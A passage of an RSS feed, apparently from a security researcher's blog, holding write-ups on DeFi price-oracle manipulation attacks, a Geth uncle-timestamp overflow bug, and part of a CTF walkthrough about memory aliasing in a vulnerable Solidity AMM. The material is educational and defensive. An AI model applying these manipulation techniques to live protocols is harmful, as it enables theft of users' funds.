spot price on a decentralized exchange may be wildly incorrect during a transaction as shown in the example below.\nConsider how a Uniswap reserve functions. The price is calculated based on the amount of assets held by the reserve, but the assets held by the reserve changes as users trade between ETH and USD. What if a malicious user performs a trade before and after taking a loan from your platform?\nBefore the user takes out a loan, they buy 5,000 ETH for 2,000,000 USD. The Uniswap exchange now calculates the price to be 1 ETH = 1,733.33 USD. Now, their 375 ETH can act as collateral for up to 433,333.33 USD worth of assets, which they borrow. Finally, they trade back the 5,000 ETH for their original 2,000,000 USD, which resets the price. The net result is that your loan platform just allowed the user to borrow an additional 333,333.33 USD without putting up any collateral.\n\nThis case study illustrates the most common mistake when using a decentralized exchange as a price oracle - an attacker has almost full control over the price during a transaction and trying to read that price accurately is like reading the weight on a scale before it’s finished settling. You’ll probably get the wrong number and depending on the situation it might cost you a lot of money.\nSynthetix MKR Manipulation\nIn December 2019, Synthetix suffered another attack as a result of price oracle manipulation. What’s notable about this one is that it crossed the barrier between on-chain price data and off-chain price data.\nReddit user u/MusaTheRedGuard observed that an attacker was making some very suspicious trades against sMKR and iMKR (inverse MKR). The attacker first purchased a long position on MKR by buying sMKR, then purchased large quantities of MKR from the Uniswap ETH/MKR pair. After waiting a while, the attacker sold their sMKR for iMKR and sold their MKR back to Uniswap. They then repeated this process.\nBehind the scenes, the attacker’s trades through Uniswap allowed them to move the price of MKR on Synthetix at will. This was likely because the off-chain price feed that Synthetix relied on was in fact relying on the on-chain price of MKR, and there wasn’t enough liquidity for arbitrageurs to reset the market back to optimal conditions.\n\nThis incident illustrates the fact that even if you think you’re using off-chain price data, you may still actually be using on-chain price data and you may still be exposed to the intricacies involved with using that data.\nThe bZx Hack\nIn February 2020, bZx was hacked twice over the span of several days for approximately 1MM USD. You can find an excellent technical analysis of both hacks written by palkeo here, but we will only be looking at the second hack.\nIn the second hack, the attacker first purchased nearly all of the sUSD on Kyber using ETH. Then, the attacker purchased a second batch of sUSD from Synthetix itself and deposited it on bZx. Using the sUSD as collateral, the attacker borrowed the maximum amount of ETH they were allowed to. They then sold back the sUSD to Kyber.\nIf you’ve been paying attention, you’ll recognize this as essentially the same undercollateralized loan attack, but using a different collateral and a different decentralized exchange.\nyVault Bug\nOn July 25, 2020, I reported a bug to yEarn regarding the launch of their new yVault contracts. You can read the official writeup about this bug here, but I will briefly summarize it below.\nThe yVault system allows users to deposit a token and earn yield on it without needing to manage it themselves. Internally, the vault tracks the total amount of yVault tokens minted as well as the total amount of underlying tokens deposited. The worth of a single yVault token is given by the ratio of tokens minted to tokens deposited. Any yield the vault earns is spread across all minted yVault tokens (and therefore, across all yVault token holders).\nThe first yVault allowed users to earn yield on USDC by supplying liquidity to the Balancer MUSD/USDC pool. When a user supplies liquidity to Balancer pools, they receive BPT in return which can be redeemed for a proportion of the pool. As such, the yVault calculated the value of its holdings based on the amount of MUSD/USDC which could be redeemed with its BPT.\nThis seems like the correct implementation, but unfortunately the same principle as given before applies - the state of the Balancer pool during a transaction is not stable and cannot be trusted. In this case, because of the bonding curve that Balancer chose, a user who swaps between from USDC to MUSD will not receive a 1:1 exchange rate, but will in fact leave behind some MUSD in the pool. This means that the value of BPT can be temporarily inflated, which allows an attacker to manipulate the price at will and subsequently drain the vault.\n\nThis incident shows that price oracles are not always conveniently labelled as such, and that developers need to be vigilant about what sort of data they’re ingesting and consider whether that data can be easily manipulated by an unprivileged user.\nHarvest Finance Hack\nOn October 26, 2020, an unknown user hacked the Harvest Finance pools using a technique that you can probably guess by now. You can read the official post-mortem here, but once again I’ll summarize it for you: the attacker deflated the price of USDC in the Curve pool by performing a trade, entered the Harvest pool at the reduced price, restored the price by reversing the earlier trade, and exited the Harvest pool at a higher price. This resulted in over 33MM USD of losses.\nHow do I protect myself?\nBy now, I hope that you’ve learned to recognize the common thread - it's not always obvious that you're using a price oracle and if you don't follow the proper precautions, an attacker could trick your protocol into sending them all of your money. While there’s no one-size-fits-all fix that can be prescribed, here are a few solutions that have worked for other projects in the past. Maybe one of them will apply to you too.\nShallow Markets, No Diving\nLike diving into the shallow end of a pool, diving into a shallow market is painful and might result in significant expenses which will change your life forever. Before you even consider the intricacies of the specific price oracle you’re planning to use, consider whether the token is liquid enough to warrant integration with your platform.\nA Bird in the Hand is Worth Two in the Bush\nIt may be mesmerizing to see the potential exchange rate on Uniswap, but nothing’s final until you actually click trade and the tokens are sitting in your wallet. Similarly, the best way to know for sure the exchange rate between two assets is to simply swap the assets directly. This approach is great because there’s no take-backs and no what-ifs. However, it may not work for protocols such as lending platforms which are required to hold on to the original asset.\nAlmost Decentralized Oracles\nOne way to summarize the problem with oracles that rely on on-chain data is that they’re a little too up-to-date. If that’s the case, why not introduce a bit of artificial delay? Write a contract which updates itself with the latest price from a decentralized exchange like Uniswap, but only when requested by a small group of privileged users. Now even if an attacker can manipulate the price, they can’t get your protocol to actually use it.\nThis approach is really simple to implement and is a quick win, but there are a few drawbacks - in times of chain congestion you might not be able to update the price as quickly as you’d like, and you’re still vulnerable to sandwich attacks. Also, now your users need to trust that you’ll actually keep the price updated.\nSpeed Bumps\nManipulating price oracles is a time-sensitive operation because arbitrageurs are always watching and would love the opportunity to optimize any suboptimal markets. If an attacker wants to minimize risk, they’ll want to do the two trades required to manipulate a price oracle in a single transaction so there’s no chance that an arbitrageur can jump in the middle. As a protocol developer, if your system supports it, it may be enough to simply implement a delay of as short as 1 block between a user entering and exiting your system.\nOf course, this might impact composability and miner collaboration with traders is on the rise. In the future, it may be possible for bad actors to perform price oracle manipulation across multiple transactions knowing that the miner they’ve partnered with will guarantee that no one can jump in the middle and take a bite out of their earnings.\nTime-Weighted Average Price (TWAP)\nUniswap V2 introduced a TWAP oracle for on-chain developers to use. The documentation goes into more detail on the exact security guarantees that the oracle provides, but in general for large pools over a long period of time with no chain congestion, the TWAP oracle is highly resistant to oracle manipulation attacks. However, due to the nature of its implementation, it may not respond quickly enough to moments of high market volatility and only works for assets for which there is already a liquid token on-chain.\nM-of-N Reporters\nSometimes they say that if you want something done right, you do it yourself. What if you gather up N trusted friends and ask them to submit what they think is the right price on-chain, and the best M answers becomes the current price?\nThis approach is used by many large projects today: Maker runs a set of price feeds operated by trusted entities, Compound created the Open Oracle and features reporters such as Coinbase, and Chainlink aggregates price data from Chainlink operators and exposes it on-chain. Just keep in mind that if you choose to use one of these solutions, you’ve now delegated trust to a third party and your users will have to do the same. Requiring reporters to manually post updates on-chain also means that during times of high market volatility and chain congestion, price updates may not arrive on time.\nConclusion\nPrice oracles are a critical, but often overlooked, component of DeFi security. Safely using price oracles is hard and there’s plenty of ways to shoot both yourself and your users in the foot. In this post, we covered past examples of price oracle manipulation and established that reading price information during the middle of a transaction may be unsafe and could result in catastrophic financial damage. We also discussed a few techniques other projects have used to combat price oracle manipulation in the past. In the end though, every situation is unique and you might find yourself unsure whether you’re using a price oracle correctly. If this is the case, feel free to reach out for advice!\nSpecial thanks to Dan Robinson and Georgios Konstantopoulos for reviewing this post, and to @zdhu_ and mongolsteppe for pointing out an error.","dc:creator":"samczsun","content":"Everything you need to know about price oracles and how to use them safely","contentSnippet":"Everything you need to know about price oracles and how to use them safely","guid":"5fa974f6c9ce5800018a69ae","isoDate":"2020-11-09T19:56:37.000Z","from":"https://samczsun.com/rss/","hashId":"8dceb43ab3e9c8abda09fd23a38293d7"},{"creator":"samczsun","title":"The Block Mined In January, 584942419325","link":"https://samczsun.com/the-block-mined-in-january-584942419325/","pubDate":"Tue, 30 Mar 2021 15:01:31 GMT","content:encoded":"<img src=\"https://samczsun.com/content/images/2021/03/12939627_xl.jpg\" alt=\"The Block Mined In January, 584942419325\"><p>This is the first in a series of blog posts about the bugs I&apos;ve found in <a href=\"https://github.com/ethereum/go-ethereum/\">go-ethereum</a> (Geth), the official Golang implementation of the Ethereum protocol. While you don&apos;t need a deep understanding of Geth in order to follow these blog posts, knowledge of how Ethereum itself works will be helpful.</p><p>This first post is about a bug in Geth&apos;s uncle validation routine which did not behave correctly given a specially crafted uncle. If exploited, this could have caused an accidental fork between Geth and Parity nodes.</p><h1 id=\"blocks-and-uncles\">Blocks and Uncles</h1><p>Every blockchain has a canonical chain, which is defined through some metric like the total length of the chain or the amount of work required to produce the total chain. However, network latency means that sometimes two blocks can be produced at the same time. Only one block can be included in the canonical chain, so the other block must be left out.</p><p>Some blockchains such as Bitcoin will completely ignore these blocks, rendering them <em>orphaned</em> from the canonical chain. Other blockchains such as Ethereum will still reward miners who put in the effort but rolled a nat 1 on block propagation. In Ethereum, these orphaned blocks that still get included are known as <em>uncles</em>.</p><p>An uncle needs to satisfy certain conditions in order to be considered valid. First, all of the block&apos;s properties must be valid according to normal consensus rules, and second, an uncle block must be the child of a block at most 6 blocks away from the current head of the chain. However, one exception applies: while normal blocks must not be more than 15 seconds in the future, an uncle block is not restricted in this way.</p><h1 id=\"a-brief-interlude-on-integers\">A Brief Interlude on Integers</h1><p>Most programming languages have the concept of platform-dependent integers and fixed-width integers. Platform-dependent integers may be 32 bits or 64 bits (or something else!) depending on the platform that the program was compiled on. In C/C++ and Go you might use <code>uint</code> while in Rust you might use <code>usize</code>.</p><p>However, sometimes the programmer might want to guarantee that their variable can hold 64 bits of data, even if the platform is 32-bit. In these cases, the programmer can use a fixed-width integer type. In C/C++ that would be <code>uint64_t</code>, in Go <code>uint64</code>, and in Rust <code>u64</code>.</p><p>The benefit of these built-in integer types is that they&apos;re all first-class citizens and thus are very simple to use. Consider this implementation of the Collatz Conjecture which supports 64-bit integers.</p><pre><code class=\"language-go\">func collatz(n uint64) uint64 {\n    if n % 2 == 0 {\n    \treturn n / 2\n    } else {\n    \treturn 3 * n + 1\n    }\n}</code></pre><p>However, this implementation has a slight flaw, it doesn&apos;t support inputs which are larger than 64 bits. For that, we&apos;ll need <em>big integers</em>. Most languages support this either within the standard library itself such as <code>big.Int</code> in Go, or through external libraries for C/C++ or Rust. </p><p>Unfortunately, using big integers has a big downside: they&apos;re much clunkier to use. This is illustrated in the reimplementation of the Collatz Conjecture, but supporting arbitrarily large integers.</p><pre><code class=\"language-go\">var big0 = big.NewInt(0)\nvar big1 = big.NewInt(1)\nvar big2 = big.NewInt(2)\nvar big3 = big.NewInt(3)\n\nfunc collatzBig(n *big.Int) *big.Int {\n\tif new(big.Int).Mod(n, big2).Cmp(big0) == 0 {\n\t\treturn new(big.Int).Div(n, big2)\n\t} else {\n\t\tv := new(big.Int).Mul(big3, n)\n\t\tv.Add(v, big1)\n\t\treturn v\n\t}\n}</code></pre><p>Clearly, the 64-bit version is much simpler to write and read, and so it&apos;s no surprise that programmers like to use simple integer types when possible.</p><h1 id=\"expectation-vs-reality\">Expectation vs Reality</h1><p>In Ethereum, most data is expected to fit within 256 bits, although some fields are only expected to be an integer value with no limit on size. Notably, the block timestamp <code>H<sub>s</sub></code> is defined to be a 256-bit integer.</p><figure class=\"kg-card kg-image-card kg-card-hascaption\"><img src=\"https://samczsun.com/content/images/2021/03/image.png\" class=\"kg-image\" alt=\"The Block Mined In January, 584942419325\" loading=\"lazy\" width=\"1000\" height=\"301\" srcset=\"https://samczsun.com/content/images/size/w600/2021/03/image.png 600w, https://samczsun.com/content/images/2021/03/image.png 1000w\" sizes=\"(min-width: 720px) 720px\"><figcaption>Ethereum Yellow Paper, page 6</figcaption></figure><p>The Geth team attempted to be faithful to this definition by validating that the timestamp on an uncle block was not larger than <code>2<sup>256</sup>-1</code>. Recall that uncles have no restrictions on future mining.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-go\">// Verify the header&apos;s timestamp\nif uncle {\n    if header.Time.Cmp(math.MaxBig256) &gt; 0 {\n        return errLargeBlockTime\n    }\n} else {\n    if header.Time.Cmp(big.NewInt(time.Now().Add(allowedFutureBlockTime).Unix())) &gt; 0 {\n        return consensus.ErrFutureBlock\n    }\n}</code></pre><figcaption><a href=\"https://github.com/ethereum/go-ethereum/blob/f03402232cd7bcc558b70a20df5b326b1d71e1ad/consensus/ethash/consensus.go#L244-L253\">Source</a></figcaption></figure><p>Unfortunately, the code then immediately coerced the block timestamp into a 64-bit integer in order to calculate the correct difficulty for the block.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-go\">// Verify the block&apos;s difficulty based in it&apos;s timestamp and parent&apos;s difficulty\nexpected := ethash.CalcDifficulty(chain, header.Time.Uint64(), parent)</code></pre><figcaption><a href=\"https://github.com/ethereum/go-ethereum/blob/f03402232cd7bcc558b70a20df5b326b1d71e1ad/consensus/ethash/consensus.go#L257-L258\">Source</a></figcaption></figure><p>This would not be so bad if Parity behaved in the same way, but Parity would saturate the timestamp at <code>2<sup>64</sup>-1</code> instead of overflowing.</p><figure class=\"kg-card kg-code-card\"><pre><code class=\"language-rust\">let mut blockheader = Header {\n    parent_hash: r.val_at(0)?,\n    uncles_hash: r.val_at(1)?,\n    author: r.val_at(2)?,\n    state_root: r.val_at(3)?,\n    transactions_root: r.val_at(4)?,\n    receipts_root: r.val_at(5)?,\n    log_bloom: r.val_at(6)?,\n    difficulty: r.val_at(7)?,\n    number: r.val_at(8)?,\n    gas_limit: r.val_at(9)?,\n    gas_used: r.val_at(10)?,\n    timestamp: cmp::min(r.val_at::&lt;U256&gt;(11)?, u64::max_value().into()).as_u64(),\n    extra_data: r.val_at(12)?,\n    seal: vec![],\n    hash: keccak(r.as_raw()).into(),\n};</code></pre><figcaption><a href=\"https://github.com/openethereum/parity-ethereum/blob/6cf3ba7efd8a366b440c7675df1c0576c8cd4762/ethcore/types/src/header.rs#L333-L349\">Source</a></figcaption></figure><p>This means that if a malicious miner included an uncle with a block timestamp of <code>584942419325-01-27 07:00:16 UTC</code>, or unix time <code>2<sup>64</sup></code>, then Geth would calculate the difficulty using unix time <code>0</code> while Parity would calculate the difficulty using unix time <code>2<sup>64</sup>-1</code>. These two values would be different, so one of the two clients would have split from the canonical chain after failing to verify the block.</p><p>The Geth team fixed this bug in <a href=\"https://github.com/ethereum/go-ethereum/pull/19372\">PR 19372</a>, which switched all timestamps to use <code>uint64</code>.</p><h1 id=\"conclusion\">Conclusion</h1><p>Every client participating in a consensus protocol must behave exactly identically, so what may seem like a completely benign operation might actually be the trigger which causes half of the network to disconnect. This also goes to show that you don&apos;t need to be highly technical in order to find impactful bugs, so if this seems like something you&apos;d be interested in, there&apos;s no better way to get started than to <a href=\"https://github.com/ethereum/go-ethereum/\">dive right in</a>.</p><p>Next time, we&apos;ll be exploring how Geth stores the data that makes up Ethereum, and how a skilled attacker could have planted a ticking time bomb that would hard fork the chain when detonated.</p>","content:encodedSnippet":"This is the first in a series of blog posts about the bugs I've found in go-ethereum (Geth), the official Golang implementation of the Ethereum protocol. While you don't need a deep understanding of Geth in order to follow these blog posts, knowledge of how Ethereum itself works will be helpful.\nThis first post is about a bug in Geth's uncle validation routine which did not behave correctly given a specially crafted uncle. If exploited, this could have caused an accidental fork between Geth and Parity nodes.\nBlocks and Uncles\nEvery blockchain has a canonical chain, which is defined through some metric like the total length of the chain or the amount of work required to produce the total chain. However, network latency means that sometimes two blocks can be produced at the same time. Only one block can be included in the canonical chain, so the other block must be left out.\nSome blockchains such as Bitcoin will completely ignore these blocks, rendering them orphaned from the canonical chain. Other blockchains such as Ethereum will still reward miners who put in the effort but rolled a nat 1 on block propagation. In Ethereum, these orphaned blocks that still get included are known as uncles.\nAn uncle needs to satisfy certain conditions in order to be considered valid. First, all of the block's properties must be valid according to normal consensus rules, and second, an uncle block must be the child of a block at most 6 blocks away from the current head of the chain. However, one exception applies: while normal blocks must not be more than 15 seconds in the future, an uncle block is not restricted in this way.\nA Brief Interlude on Integers\nMost programming languages have the concept of platform-dependent integers and fixed-width integers. Platform-dependent integers may be 32 bits or 64 bits (or something else!) depending on the platform that the program was compiled on. In C/C++ and Go you might use uint while in Rust you might use usize.\nHowever, sometimes the programmer might want to guarantee that their variable can hold 64 bits of data, even if the platform is 32-bit. In these cases, the programmer can use a fixed-width integer type. In C/C++ that would be uint64_t, in Go uint64, and in Rust u64.\nThe benefit of these built-in integer types is that they're all first-class citizens and thus are very simple to use. Consider this implementation of the Collatz Conjecture which supports 64-bit integers.\nfunc collatz(n uint64) uint64 {\n    if n % 2 == 0 {\n    \treturn n / 2\n    } else {\n    \treturn 3 * n + 1\n    }\n}\nHowever, this implementation has a slight flaw, it doesn't support inputs which are larger than 64 bits. For that, we'll need big integers. Most languages support this either within the standard library itself such as big.Int in Go, or through external libraries for C/C++ or Rust. \nUnfortunately, using big integers has a big downside: they're much clunkier to use. This is illustrated in the reimplementation of the Collatz Conjecture, but supporting arbitrarily large integers.\nvar big0 = big.NewInt(0)\nvar big1 = big.NewInt(1)\nvar big2 = big.NewInt(2)\nvar big3 = big.NewInt(3)\n\nfunc collatzBig(n *big.Int) *big.Int {\n\tif new(big.Int).Mod(n, big2).Cmp(big0) == 0 {\n\t\treturn new(big.Int).Div(n, big2)\n\t} else {\n\t\tv := new(big.Int).Mul(big3, n)\n\t\tv.Add(v, big1)\n\t\treturn v\n\t}\n}\nClearly, the 64-bit version is much simpler to write and read, and so it's no surprise that programmers like to use simple integer types when possible.\nExpectation vs Reality\nIn Ethereum, most data is expected to fit within 256 bits, although some fields are only expected to be an integer value with no limit on size. Notably, the block timestamp Hs is defined to be a 256-bit integer.\nEthereum Yellow Paper, page 6\nThe Geth team attempted to be faithful to this definition by validating that the timestamp on an uncle block was not larger than 2256-1. Recall that uncles have no restrictions on future mining.\n\n// Verify the header's timestamp\nif uncle {\n    if header.Time.Cmp(math.MaxBig256) > 0 {\n        return errLargeBlockTime\n    }\n} else {\n    if header.Time.Cmp(big.NewInt(time.Now().Add(allowedFutureBlockTime).Unix())) > 0 {\n        return consensus.ErrFutureBlock\n    }\n}\nSource\nUnfortunately, the code then immediately coerced the block timestamp into a 64-bit integer in order to calculate the correct difficulty for the block.\n\n// Verify the block's difficulty based in it's timestamp and parent's difficulty\nexpected := ethash.CalcDifficulty(chain, header.Time.Uint64(), parent)\nSource\nThis would not be so bad if Parity behaved in the same way, but Parity would saturate the timestamp at 264-1 instead of overflowing.\n\nlet mut blockheader = Header {\n    parent_hash: r.val_at(0)?,\n    uncles_hash: r.val_at(1)?,\n    author: r.val_at(2)?,\n    state_root: r.val_at(3)?,\n    transactions_root: r.val_at(4)?,\n    receipts_root: r.val_at(5)?,\n    log_bloom: r.val_at(6)?,\n    difficulty: r.val_at(7)?,\n    number: r.val_at(8)?,\n    gas_limit: r.val_at(9)?,\n    gas_used: r.val_at(10)?,\n    timestamp: cmp::min(r.val_at::<U256>(11)?, u64::max_value().into()).as_u64(),\n    extra_data: r.val_at(12)?,\n    seal: vec![],\n    hash: keccak(r.as_raw()).into(),\n};\nSource\nThis means that if a malicious miner included an uncle with a block timestamp of 584942419325-01-27 07:00:16 UTC, or unix time 264, then Geth would calculate the difficulty using unix time 0 while Parity would calculate the difficulty using unix time 264-1. These two values would be different, so one of the two clients would have split from the canonical chain after failing to verify the block.\nThe Geth team fixed this bug in PR 19372, which switched all timestamps to use uint64.\nConclusion\nEvery client participating in a consensus protocol must behave exactly identically, so what may seem like a completely benign operation might actually be the trigger which causes half of the network to disconnect. This also goes to show that you don't need to be highly technical in order to find impactful bugs, so if this seems like something you'd be interested in, there's no better way to get started than to dive right in.\nNext time, we'll be exploring how Geth stores the data that makes up Ethereum, and how a skilled attacker could have planted a ticking time bomb that would hard fork the chain when detonated.","dc:creator":"samczsun","content":"In a consensus protocol, the simplest mistake could have devastating effects.","contentSnippet":"In a consensus protocol, the simplest mistake could have devastating effects.","guid":"605d68558b092400019e9ed2","isoDate":"2021-03-30T15:01:31.000Z","from":"https://samczsun.com/rss/","hashId":"3f396a2043fd1169251a236eff130c5f"},{"creator":"samczsun","title":"Paradigm CTF 2021 - swap","link":"https://samczsun.com/paradigm-ctf-2021-swap/","pubDate":"Fri, 09 Apr 2021 17:17:56 GMT","content:encoded":"<img src=\"https://samczsun.com/content/images/2021/04/51657140_xl.jpg\" alt=\"Paradigm CTF 2021 - swap\"><p><em>When you have eliminated all which is impossible, then whatever remains, however improbable, must be the truth - Sherlock Holmes</em></p><p>Paradigm CTF 2021 took place in early February and together, players solved all but two of the challenges during the competition (and one of the remaining two mere days later).</p><figure class=\"kg-card kg-embed-card\"><blockquote class=\"twitter-tweet\"><p lang=\"en\" dir=\"ltr\">Epic video stream by <a href=\"https://twitter.com/adietrichs?ref_src=twsrc%5Etfw\">@adietrichs</a> successfully solving <a href=\"https://twitter.com/paradigm_ctf?ref_src=twsrc%5Etfw\">@paradigm_ctf</a> JOP challenge. Congrats!<br><br>Part 1: <a href=\"https://t.co/1RDISh7TZl\">https://t.co/1RDISh7TZl</a><br>Part 2: <a href=\"https://t.co/ZLonJUsjHf\">https://t.co/ZLonJUsjHf</a></p>&#x2014; Peter Kacherginsky (@_iphelix) <a href=\"https://twitter.com/_iphelix/status/1359373577485623302?ref_src=twsrc%5Etfw\">February 10, 2021</a></blockquote>\n<script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n</figure><p>However, the second of the two remained unsolved for almost 2 months until just a few days ago.</p><figure class=\"kg-card kg-embed-card\"><blockquote class=\"twitter-tweet\"><p lang=\"en\" dir=\"ltr\">It finally happened! Congrats to <a href=\"https://twitter.com/HRitzdorf?ref_src=twsrc%5Etfw\">@HRitzdorf</a> and <a href=\"https://twitter.com/a_permenev?ref_src=twsrc%5Etfw\">@a_permenev</a> for solving the infamous &apos;swap&apos; challenge from <a href=\"https://twitter.com/paradigm_ctf?ref_src=twsrc%5Etfw\">@paradigm_ctf</a>. Official write-up and solutions will be posted in a few days so now&apos;s your chance to give it one last shot!<a href=\"https://t.co/wNGnJLA0u8\">https://t.co/wNGnJLA0u8</a></p>&#x2014; samczsun (@samczsun) <a href=\"https://twitter.com/samczsun/status/1379938686511558658?ref_src=twsrc%5Etfw\">April 7, 2021</a></blockquote>\n<script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n</figure><p>Today, we&apos;ll be taking a look at <code>swap</code> in the form of a guided walkthrough. Each section will give you a small hint at the end in case you&apos;re stuck. If you haven&apos;t already, take a look at the challenge files <a href=\"https://github.com/paradigm-operations/paradigm-ctf-2021/tree/c84e7307769cdf08e76ab32755e0d3816ad3bff4/swap/public/contracts\">here</a> and familiarize yourself with the code.</p><h1 id=\"the-challenge\">The Challenge</h1><p>This challenge implements a fictional stablecoin AMM. Users can do all the things you&apos;d expect from an AMM: &#xA0;swap assets and mint/burn/transfer LP shares. The contract is initialized with 100 ether worth of four stablecoins (DAI, TUSD, USDC, USDT) and the win condition is to reduce the TVL of the AMM to 1% of what it started with.</p><p>Initially, you might assume that there&apos;s a bug in the <code>swap</code> function, but it&apos;s easy to confirm with reasonable confidence that the function behaves as expected and won&apos;t give you any free stablecoins.</p><p>You might also try stealing the LP tokens from the setup contract itself, but the ERC20 implementation appears to be correct and so that&apos;s impossible too.</p><p>You could try minting and burning LP tokens, but you&apos;ll find that the invariants appear to be correctly maintained and that you can&apos;t mint more LP tokens than you deserve, or burn more LP tokens that you have.</p><p>Finally, just to really drive the point home, all functions are marked <code>nonReentrant</code>.</p><p>At this point, the challenge is looking pretty hopeless so under contest conditions it&apos;s perfectly reasonable to just drop it and move onto a different problem. However, now that we have all the time in the world, how might we tackle this?</p><p>Well, keen observers might notice that the win condition is slightly different in this challenge. In every other challenge, it&apos;s always required to drain the entire contract of all assets. However, in this challenge, you only need to drain a percentage. Why might this be?</p><h1 id=\"everything-is-intentional\">Everything Is Intentional</h1><p>One of the lessons I&apos;ve learned the hard way is that everything in a CTF, no matter how innocuous, is intentional. In this sense, the win condition is a subtle hint towards what the solution requires. The fact that you don&apos;t need to drain all of the assets to win should strongly suggest that it&apos;s in fact <em>impossible</em> to drain all of the assets.</p><p>But what does this mean for us? Working from first principles, we can reset our assumptions by following this chain of logic:</p><ol><li>We need to remove (some, but not all) assets from the pool</li><li>The only way for assets to leave the pool is through a swap or a burn</li><li>Swapping appears to be correctly implemented such that no assets can be stolen</li><li>Burning also appears to be correctly implemented such that no assets can be stolen</li><li>However, while swapping is a single-step process, burning is a two-step process where the first step is somehow acquiring LP tokens. The burn operation itself says nothing about where the LP tokens come from, so there must be a way to get free LP tokens</li></ol><p>The subtle hint also reinforces this theory. Assuming that we can&apos;t steal the LP tokens from the setup contract, we&apos;ll never be able to burn 100% of all LP tokens and so we&apos;ll never be able to drain the entire contract.</p><p>Under the assumption that there must be a way to get free LP tokens, can you figure out what the solution is?</p><h1 id=\"no-matter-how-improbable\">No Matter How Improbable</h1><p>There are only two ways to get LP tokens. The first is to mint them, and the second is to be transferred them. We&apos;ve already established that the ERC20 implementation is sound (although you may want to double-check that before committing yourself to the more challenging route) which leaves us with the <code>mint</code> function.</p><pre><code class=\"language-solidity\">     struct MintVars {\n        uint totalSupply;\n        uint totalBalanceNorm;\n        uint totalInNorm;\n        uint amountToMint;\n        \n        ERC20Like token;\n        uint has;\n        uint preBalance;\n        uint postBalance;\n        uint deposited;\n    }\n \n    function mint(uint[] memory amounts) public nonReentrant returns (uint) {\n        MintVars memory v;\n        v.totalSupply = supply;\n        \n        for (uint i = 0; i &lt; underlying.length; i++) {\n            v.token = underlying[i];\n            \n            v.preBalance = v.token.balanceOf(address(this));\n            \n            v.has = v.token.balanceOf(msg.sender);\n            if (amounts[i] &gt; v.has) amounts[i] = v.has;\n            \n            v.token.transferFrom(msg.sender, address(this), amounts[i]);\n            \n            v.postBalance = v.token.balanceOf(address(this));\n            \n            v.deposited = v.postBalance - v.preBalance;\n\n            v.totalBalanceNorm += scaleFrom(v.token, v.preBalance);\n            v.totalInNorm += scaleFrom(v.token, v.deposited);\n        }\n        \n        if (v.totalSupply == 0) {\n            v.amountToMint = v.totalInNorm;\n        } else {\n            v.amountToMint = v.totalInNorm * v.totalSupply / v.totalBalanceNorm;\n        }\n        \n        supply += v.amountToMint;\n        balances[msg.sender] += v.amountToMint;\n        \n        return v.amountToMint;\n    }</code></pre><p>The goal now is to somehow adjust <code>v.amountToMint</code> such that we are minted way more LP tokens than we deserve. We can start by reviewing the function itself again, but this time with a fine-tooth comb. The function begins by constructing an object to represent the local variables. Then, for each token, we record the current balance of the AMM as well as the balance of the sender. If the amount to be deposited is greater than the sender&apos;s balance, then we update the amount requested. We perform the transfer, record the current balance again, then update the total deposited counters appropriately.</p><p>Nothing is immediately obvious, so we must begin eliminating the impossible and leave ourselves with only the improbable. Unfortunately, sometimes we might not know enough to immediately differentiate between the impossible and the improbable, so we&apos;ll need to keep an open mind.</p><p>We can again reset our assumptions by working from first principles using the following chain of logic:</p><ol><li>We clearly need to change <code>v.amountToMint</code> in such a way that the value is larger than what it should be</li><li>The equation to calculate the amount to mint is implemented correctly</li><li>Therefore, there must be another way to either tamper with <code>v.amountToMint</code> directly or to tamper with one of the values it depends on.</li></ol><p>Do you see any way to do this, even if it seems impossible or improbable at first?</p><h1 id=\"true-names-have-power\">True Names Have Power</h1><p>Notice that <code>v.amountToMint</code> is a field on <code>MintVars memory v</code>. This means that any time we write to <code>v.amountToMint</code>, we&apos;re actually writing to memory. Unlike data on the stack (recall that the EVM is a stack-based VM), data in memory can be <em>aliased</em>, meaning that the same data can be accessed through multiple symbolic names.</p><p>It just so happens that we have two pointers to memory in scope. The first is <code>MintVars memory v</code>, and the second is <code>uint[] memory amounts</code>. If we could somehow cause the latter to point to the same memory address as the former, then we could trigger undefined behavior by updating one through the other.</p><p>In order to understand where the <code>amounts</code> variable comes from, we&apos;ll first take a brief detour to the land of the Solidity ABI. All transactions are but blobs of data, and it&apos;s the job of the ABI to define a standard way of parsing that blob into structed information. Before a contract&apos;s code is executed, Solidity inserts some logic which decodes the transaction data into the types that the code expects. Only then does the contract begin executing.</p><p>In the case of <code>mint(uint256[])</code>, the ABI decoder will decode the transaction data into a single array of <code>uint256</code>. Is there some way that we can trick the ABI decoder into causing the decoded array to alias with the <code>MintVars</code> object constructed later?</p><h1 id=\"around-the-world\">Around the World</h1><p>According to the Solidity documentation, the ABI encoding of an array is as follows:</p><pre><code>&lt;- 32 bytes -&gt;\n\nOOOOO....OOOOO [offset to array start]\n    [....]\nLLLLL....LLLLL [length in words]\nDDDDD....DDDDD [data #1]\nDDDDD....DDDDD [data #2]\n    [....]\nDDDDD....DDDDD [data #L]\n</code></pre><p>To parse that data, the ABI decoder runs the following pseudocode:</p><pre><code class=\"language-solidity\">function decodeArrayAt(uint arg) private returns (bytes memory) {\n    uint offset = read(0x04+0x20*arg);\n    uint length = read(0x04+offset);\n    bytes memory data = malloc(length);\n    memcpy(data, 0x04 + offset + 0x20, length);\n    return data;\n}</code></pre><p>So far so good. Let&apos;s take a look at how <code>malloc</code> is implemented, again in pseudocode:</p><pre><code class=\"language-solidity\">function malloc(uint size) private returns (bytes memory) {\n    bytes memory buf;\n    assembly {\n        buf := mload(0x40)\n        mstore(0x40, add(add(buf, size), 0x20))\n        mstore(buf, size)\n    }\n    return buf;\n}</code></pre><p>Solidity uses what is known as a linear memory allocator (or arena-based allocator). This just means that Solidity will allocate new memory linearly along the block of total available memory. To allocate a new chunk, Solidity reads the <em>free-memory pointer</em> stored at <code>0x40</code> to determine where the next free address is, and moves it forward to reflect the fact that a new chunk of memory was just allocated.</p><p>Notice that there are no checks to ensure that the amount of memory requested is not excessively large. This means that if one was to allocate a specific amount of memory, then the free memory pointer may overflow and begin re-allocating in-use memory. In this case, two calls to the pseudo-<code>malloc</code> might return pointers which alias each other.</p><p>Fortunately for us, we can control exactly the size of memory the allocator will allocate simply by changing the ABI-encoded representation of our array. This lets us cause the allocator to allocate <code>v</code> over top of our <code>amounts</code> array.</p><p>Can you figure out the final step to solving this challenge?</p><h1 id=\"technical-difficulties\">Technical Difficulties</h1><p>Because 